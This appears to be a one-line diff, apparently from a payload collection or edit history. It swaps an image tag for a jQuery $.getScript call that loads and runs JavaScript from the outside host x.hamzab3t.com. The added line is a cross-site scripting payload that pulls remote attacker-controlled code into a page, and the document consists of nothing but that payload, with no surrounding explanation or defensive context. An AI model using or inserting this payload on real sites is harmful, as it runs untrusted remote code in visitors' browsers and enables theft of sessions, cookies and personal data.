@@ -1,1 +1,1 @@
-<img src='//x.hamzab3t.com'>
+$.getScript("//x.hamzab3t.com")
